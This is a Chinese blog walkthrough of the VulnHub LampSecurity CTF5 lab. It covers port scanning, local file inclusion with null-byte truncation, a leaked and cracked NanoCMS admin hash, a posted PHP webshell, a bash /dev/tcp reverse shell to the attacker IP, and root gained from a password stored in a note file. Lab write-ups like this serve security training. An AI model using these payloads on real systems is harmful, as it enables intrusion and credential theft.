+++
date = '2026-10-29T20:47:09+08:00'
draft = false
title = '[VulnHub靶机]LampSecurityCTF5渗透记录'
tags = ['渗透','Vulnhub','NanoCMS','LFI']
+++

## 信息搜集

攻击机IP: 192.168.200.146
使用arp-scan获得靶机IP: 192.168.200.168

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ sudo arp-scan -l                              
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.168 00:0c:29:98:3a:75       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
```

探测TCP端口开放情况

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.168
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 20:48 +0800
Nmap scan report for 192.168.200.168
Host is up (0.0031s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
901/tcp   open  samba-swat
3306/tcp  open  mysql
51125/tcp open  unknown
MAC Address: 00:0C:29:98:3A:75 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds
```

对开放的端口进行深入扫描

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ sudo nmap -sT -sV -sC -p22,25,80,110,111,139,143,445,901,3306,51125 192.168.200.168
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 20:49 +0800
Nmap scan report for 192.168.200.168
Host is up (0.00069s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey: 
|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
25/tcp    open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello [192.168.200.146], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))
|_http-title: Phake Organization
|_http-server-header: Apache/2.2.6 (Fedora)
110/tcp   open  pop3        ipop3d 2006k.101
|_pop3-capabilities: STLS TOP USER UIDL LOGIN-DELAY(180)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_ssl-date: 2026-10-29T08:52:32+00:00; -3h58m20s from scanner time.
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          51125/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
|_imap-capabilities: MULTIAPPEND CAPABILITY LOGIN-REFERRALS STARTTLSA0001 ESEARCH UIDPLUS THREAD=ORDEREDSUBJECT IDLE SORT BINARY NAMESPACE IMAP4REV1 MAILBOX-REFERRALS SCAN LITERAL+ CHILDREN completed OK UNSELECT WITHIN THREAD=REFERENCES SASL-IR
|_ssl-date: 2026-10-29T08:52:32+00:00; -3h58m21s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
3306/tcp  open  mysql       MySQL 5.0.45
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 5
|   Capabilities flags: 41516
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, LongColumnFlag, SupportsCompression, ConnectWithDatabase, SupportsTransactions
|   Status: Autocommit
|_  Salt: !sF@PQ'jc3sh3cwM]hu2
51125/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:98:3A:75 (VMware)
Service Info: Hosts: localhost.localdomain, 192.168.200.168; OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: -2h58m19s, deviation: 2h00m01s, median: -3h58m20s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a-6.fc8)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2026-10-29T04:51:19-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.00 seconds
```

进行漏洞扫描, 发现Web服务存在一些有意思的页面

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ sudo nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306,51125 192.168.200.168                                                                             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 20:52 +0800
Nmap scan report for 192.168.200.168
Host is up (0.00061s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
| http-enum: 
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8
|   /squirrelmail/images/sm_logo.png: SquirrelMail
|   /icons/: Potentially interesting folder w/ directory listing
|_  /inc/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
901/tcp   open  samba-swat
3306/tcp  open  mysql
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
51125/tcp open  unknown
MAC Address: 00:0C:29:98:3A:75 (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 144.98 seconds
```

探测UDP端口开放情况

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ sudo nmap -sU --min-rate 10000 192.168.200.168
[sudo] kali 的密码：
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 20:52 +0800
Nmap scan report for 192.168.200.168
Host is up (0.00066s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
111/udp   open   rpcbind
5353/udp  open   zeroconf
30544/udp closed unknown
32768/udp open   omad
MAC Address: 00:0C:29:98:3A:75 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

列出smb服务共享, 没有发现有用的信息

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ smbclient -L 192.168.200.168 -N               
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        homes           Disk      Home Directories
        IPC$            IPC       IPC Service (Samba Server Version 3.0.26a-6.fc8)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
```

访问Web服务

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E8%AE%BF%E9%97%AEWeb%E6%9C%8D%E5%8A%A1.avif)

点击Blog会发现是NanoCMS页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/NanoCMS.avif)

访问/info.php, 发现是phpinfo页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/info.php.avif)

访问/phpmyadmin/

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/phpmyadmin.avif)

访问/squirrelmail/src/login.php

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/squirrelmail.avif)

访问/icons/里面是一堆图标

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/icons.avif)

访问/inc/, 发现是主页的文本

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/inc.avif)

## 漏洞利用

考虑到/inc/与主页的文本一致, 怀疑存在文件包含漏洞, 使用file?=../../../../../../etc/passwd参数试了一下, 没有效果, 使用ffuf爆破参数

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ ffuf -u 'http://192.168.200.168/?FUZZ=../../../../../../etc/passwd' -w /usr/share/wordlists/wfuzz/general/common.txt -fs 1538 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.200.168/?FUZZ=../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1538
________________________________________________

page                    [Status: 200, Size: 1619, Words: 89, Lines: 59, Duration: 26ms]
:: Progress: [951/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

发现page参数, 访问发现出错: 服务器自动在passwd末尾加上了.php后缀, 导致文件不存在

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/page%E5%8F%82%E6%95%B0%E5%87%BA%E9%94%99.avif)

这难不倒我们, 我们可以在URL末尾加上%00, 这样服务器在处理时就会截断后面的.php后缀, 成功读取passwd文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87.avif)

接下来我打算走日志投毒流程, 然而我尝试了apache的access.log, error.log, 系统的auth.log, secure, 以及邮件日志mail.log都是文件不存在, 尝试读取shadow显示无权限, 尝试其它路径

之前访问squirrelmail时发现版本号为1.4.11-1.fc8, 使用searchsploit搜索历史漏洞

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ searchsploit SquirrelMail 1.4.11      
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SquirrelMail < 1.4.22 - Remote Code Execution                                                                                        | linux/remote/41910.sh
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

发现一个RCE漏洞但阅读后发现需要提供凭据

```sh
# Log in
echo -e "\n[*] Enter SquirrelMail user credentials"
read -p  "user: " squser
read -sp "pass: " sqpass
```

回顾之前的NanoCMS, 使用searchsploit搜索历史漏洞

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ searchsploit nanocms
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
NanoCMS v0.4 - Remote Code Execution (RCE) (Authenticated)                                               | php/webapps/50997.py
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

发现一个RCE漏洞, 但仍需登录

在网上搜索该CMS存在的漏洞, 得知访问/data/pagesdata.txt可获得管理员密码哈希

访问ttp://192.168.200.168/~andy/data/pagesdata.txt

```json
a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}
```

发现`admin`密码哈希为`9d2f75377ac0ab991d40c91fd27e52fd`, 在somd5上查询发现密码为`shannon`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81.avif)

登录nanocms后台http://192.168.200.168/~andy/data/nanoadmin.php

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E7%99%BB%E5%BD%95nanocms%E5%90%8E%E5%8F%B0.avif)

现在我们可以使用上面的RCE漏洞了, 我看了一下代码逻辑, 发现就是通过发布包含PHP代码的文章, 再去访问它, 以实现远程代码执行, 我们可以直接手动来  
发布包含一句话木马的帖子

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF5/%E5%8F%91%E5%B8%83%E5%8C%85%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84%E5%B8%96%E5%AD%90.avif)

访问http://192.168.200.168/~andy/data/pages/pieyue.php?cmd=whoami, 发现果然返回了用户名

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ curl http://192.168.200.168/~andy/data/pages/pieyue.php?cmd=whoami
apache
```

攻击机在4444端口上开启监听, cmd传入参数bash+-c+%22bash+-i+%3E%26%2Fdev%2Ftcp%2F192.168.200.146%2F4444+0%3E%261%22, 即可反弹shell

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF5]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.168] 47743
bash: no job control in this shell
bash-3.2$ whoami
apache
```

## 权限提升

终端升级

```shell
bash-3.2$ python -c "import pty;pty.spawn('/bin/bash')"
bash-3.2$ tty
tty
/dev/pts/0
```

### 枚举

使用grep查找/home/目录下所有包含`password`的文件  
-R: 递归查找
-i: 不区分大小写

```shell
grep -R -i password /home/* 2>/dev/null
```

在搜索到的信息中发现这样一个文件

```text
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  <title>Root password</title>
```

读取它发现告诉我们root密码为`50$cent`

```xml
<?xml version="1.0" encoding="utf-8"?>
<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
  <title>Root password</title>
  <text xml:space="preserve"><note-content version="0.1">Root password

Root password

50$cent</note-content></text>
  <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
  <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
  <cursor-position>15</cursor-position>
  <width>450</width>
  <height>360</height>
  <x>0</x>
  <y>0</y>
  <open-on-startup>False</open-on-startup>
</note>
```

切换用户

```shell
bash-3.2$ su root
su root
Password: 50$cent

[root@localhost pages]#
```

本靶机无flag, 拿到root权限即完成
